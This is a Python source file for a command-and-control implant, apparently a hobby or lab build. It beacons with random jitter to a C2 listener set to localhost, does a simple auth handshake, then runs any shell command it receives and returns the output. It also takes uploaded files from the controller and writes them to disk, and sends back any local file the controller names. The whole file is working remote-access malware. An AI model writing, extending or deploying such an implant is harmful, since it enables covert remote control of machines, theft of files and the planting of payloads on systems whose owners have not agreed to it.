import struct
import socket
import time
import subprocess
import os 
import hashlib
import random
import signal
import sys


# GLOBAL CONSTANTS
HEADER_FORMAT = '!B H I I'  					# B = MTYPE (1 byte); H = SEQ (2 bytes); I = PAYLOAD LENGTH (4 bytes); I = TIMESTAMP (4 bytes)
HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 	# CALCULATES AND RETURNS HEADER_SIZE IN BYTES
C2_IP = '127.0.0.1'								
C2_PORT = 1346
KEY = 'placeholder'
seq = 404

# PROTOCOL MESSAGE TYPES
MT_BEACON 	= 0
MT_AUTH 	= 1
MT_CMD		= 2
MT_RECV		= 3
MT_UP		= 4
MT_DWN		= 5
MT_DATA		= 6
MT_ERR		= 7

# HELPER FUNCTIONS

def beacon():
    time.sleep(random.uniform(0, random.randint(2,10)))			                      # JITTER
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	                      # SPAWN SOCKET ON EPHEMERAL PORT
        s.connect((C2_IP, C2_PORT))								                      # CONNECT TO C2
        s.settimeout(5)											                      # ALLOW 5 SEC FOR SOCKET TIMEOUT
        return s  												                      # RETURN SOCKET AS S
    except Exception as e:
        print(e)
        return None

def signal_handler(signum, frame):
    print('\n=== SHUTTING DOWN... ===')
    sys.exit(0)

def run_cmd(cmd: str) -> bytes:
    cmd = cmd.decode()
    try:
        output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return output.stdout + output.stderr
    except Exception as e:
        return f'Command failed: {e}'.encode()

def recv_packet(s):
    header = b''                                                                      # RECEIVE HEADER
    while len(header) < HEADER_SIZE:
        packet = s.recv(HEADER_SIZE - len(header))
        if not packet:
            raise ConnectionError('connection error')
        header += packet 
    mtype, seq, payload_length, timestamp = struct.unpack(HEADER_FORMAT, header)      # UNPACK HEADER

    if payload_length > 0:                                                            # RECEIVE PAYLOAD
        payload = b''
        while len(payload) < payload_length:
            packet = s.recv(payload_length - len(payload))
            if not packet:
                raise ConnectionError('connection error')
            payload += packet 
    else:
        payload = b''
                      
    return mtype, seq, payload_length, timestamp, payload

def send_data(s, mtype: int, seq: int, payload: bytes) -> bool:
    try: 
        timestamp = int(time.time())
        header = struct.pack(HEADER_FORMAT, mtype, seq, len(payload), timestamp)
        s.sendall(header + payload)
        #seq += 1
        return True
    except Exception as e:
        print(e)
        return False

def init():
        while True:
        
            s = beacon()
            
            if not s:
                continue 

            try: # INITIAL BEACON 
                print('+++ connected to listener +++')
                beacon_seq = 0
                send_data(s, MT_BEACON, beacon_seq, b'')
                beacon_seq += 1
                print('=== beaconing... ===')
                
                # RECEIVE AUTH_REQ
                response = recv_packet(s)
                
                # SEND AUTH_OK RESPONSE
                if response[0] == MT_AUTH:
                    send_data(s, MT_AUTH, beacon_seq, b'')
                    print('sent MT_AUTH response packet')
            
                    return s   # return socket and sequence number

                else:
                    print(f'wrong msg type received: {response[0]}')
                    s.close()
                    continue

            except Exception as e:
                print(e)
                try:
                    s.close()
                except:
                    pass
                continue

def recv_file(s, packet) -> bool:
                       
    try:
        metadata = packet[4].decode('utf-8', errors='replace')  # DECODE PACKET METADATA PAYLOAD
        unpack_metadata = metadata.split('|', 2)                # READY METADATA FOR UNPACKING
        
        if len(unpack_metadata) != 3:                           # RETURN FALSE IF PACKET METADATA NOT AS EXPECTED
            print(f'Invalid metadata: {metadata}')
            return False
        
        file_name, file_size, file_hash = unpack_metadata       # UNPACK METADATA
        file_size = int(file_size)                              # SET FILE_SIZE AS TYPE INT

        print(f'unpacked metadata: {metadata}')

        send_data(s, MT_UP, seq, b'')                           # SIGNAL C2 TO START UPLOAD WITH MT_UP OK PACKET

        file_bytes = bytearray()                                # DECLARE BYTEARRAY FOR APPENDING
        file_bytes_recv = 0                                     # RECEIVES AND COLLECTS LENGTH OF UPLOADED BYTES
        while file_bytes_recv < file_size:                      # WHILE LOOP TO KEEP RECEIVING BYTES UNTIL RECEIVED BYTES == EXPECTED FILE SIZE
            response = recv_packet(s)
            if response[0] == MT_DATA:
                file_bytes.extend(response[4])
                file_bytes_recv += len(response[4])
            
            else:
                print(f'unexpected mtype during upload: {response[0]}')
                break

        print('file received')

        mem_file_hash = hashlib.sha256(file_bytes).hexdigest()                                                  # GETS SHA256 HASH OF RECEIVED FILE AS IN MEMORY
        local_metadata = f'{file_name}|{file_bytes_recv}|{mem_file_hash}'.encode('utf-8', errors='replace')     # PACKAGES RECEIVED FILE LOCAL METADATA

        if mem_file_hash == file_hash and file_bytes_recv == file_size:     # IF LOCAL AND REMOTE HASH AND FILE SIZE MATCH THEN WRITE TO DISK AND SEND ACK PACKET TO C2 AND RETURN TRUE
            print('INEGRITY ACK - TRUE')
            
            with open(file_name, 'wb') as file:
                file.write(file_bytes)
            print('file written to disk')

            send_data(s, MT_UP, seq, local_metadata)
            return True

        else: 
            print('integrity check failed...')  
            return False                        # IF HASH AND FILE SIZE INTEGRITY CHECK FAIL RETURN FALSE

    except Exception as e:
        print(f'ERROR: {e}')
        return False                            # IF C2 -> REVSH FILE UPLOAD FAILS RETURN FALSE

def send_file(s, packet) -> bool:
    
    try:
        local_filepath = packet[4].decode('utf-8', errors='replace')
        if not os.path.exists(local_filepath):
            send_data(s, MT_ERR, seq, b'ERROR: FILE NOT FOUND')
            return False
        else:
            with open(local_filepath, 'rb') as file:        # OPEN FILE FOR BINARY READ
                file_bytes = file.read()                    # READ FILE BYTES
            file_size = len(file_bytes)                     # GET FILE BYTE SIZE

            file_hash = hashlib.sha256(file_bytes).hexdigest()                                                          # GENERATE FILE HASH
            metadata = f'{os.path.basename(local_filepath)}|{file_size}|{file_hash}'.encode('utf-8', errors='replace')  # GENERATE AND ENCODE METADATA

            send_data(s, MT_DWN, seq, metadata)             # SEND LOCAL FILE METADATA TO C2

            chunk_size = 4096                               # SETS CHUNK SIZE
            chunk_seq = 0                               
            for c in range(0, file_size, chunk_size):   # FOR LOOP TO SEND FILE BYTES IN CHUNKS UNTIL ENTIRE FILE IS SENT
                chunk = file_bytes[c:c+chunk_size]
                if not send_data(s, MT_DATA, chunk_seq, chunk):
                    print('--- CONNECTION ERROR - FAILED TO SEND FILE DATA ---')
                chunk_seq += 1
                print('FILE SENT!!!')

            metadata_receipt_packed = recv_packet(s)        # RECEIVE METADATA RECEIPT
            metadata_receipt = metadata_receipt_packed[4]   # UNPACK METADATA RECEIPT
            
            if metadata == metadata_receipt:                # IF LOCAL FILE METADATA AND METADATA RECEIPT MATCH THEN...
                print(f'FILE {local_filepath} SENT!!!')
                return True

    except Exception as e:
        print(e)
        return False


# MAIN FUNCTION
def main():

    signal.signal(signal.SIGINT, signal_handler)    # SIGNAL HANDLERS
    signal.signal(signal.SIGTERM, signal_handler)   # SIGNAL HANDLERS

    while True:             # OUTER WHILE TRUE TRY LOOP FOR RECONNECTION
        s = None
        try:
            s = init()
            print('connection successful')

            while True:                 # INNER WHILE TRUE TRY LOOP FOR COMMAND EXECUTION FLOW         
                try:
                    response = recv_packet(s)                                       # RECEIVE PACKETS
                    
                    if response[0] == MT_CMD:                                       # LOOKS FOR MT_CMD PACKET
                        print('received MT_CMD')                            
                        send_data(s, MT_RECV, seq, run_cmd(response[4].strip()))    # RUNS CMD LOCALLY AND RETURNS OUTPUT TO C2
                        print('SENT MT_RECV')
                        continue
                    
                    elif response[0] == MT_UP:
                        if recv_file(s, response):
                            print(f'FILE RECEIVED: {response[4]}')
                        else: 
                            print('ERROR: FILE NOT RECEIVED')
                        continue

                    elif response[0] == MT_DWN:
                        print('CAUGHT MT_DWN PACKET')
                        if send_file(s, response):
                            print(f'FILE SENT: {response[4].decode('utf-8', errors='replace')}')
                        else:
                            print('ERROR: FILE NOT SENT')
                        continue

                    else:                                                           # ELSE IF UNKNOWN MTYPE LISTEN FOR NEW PACKET
                        print(f'PACKET WITH UNKNOWN MTYPE: {response}')
                        continue

                except Exception as e:  # INNER WHILE TRUE TRY LOOP GENERAL EXCEPTION HANDLER BREAKING LOOP ON ERROR
                    print(f'ERROR: {e}')
                    break

        except Exception as e:  # EXCEPTION
            print(f'CONNECTION ERROR: {e}')   
        
        finally:                # CLOSE SOCKET AND IGNORE ERRORS
            if s != None:
                try:
                    s.close()
                except:
                    pass
            print('--- CONNECTION CLOSED ---')

# MAIN GUARD
if __name__ == '__main__':
	main()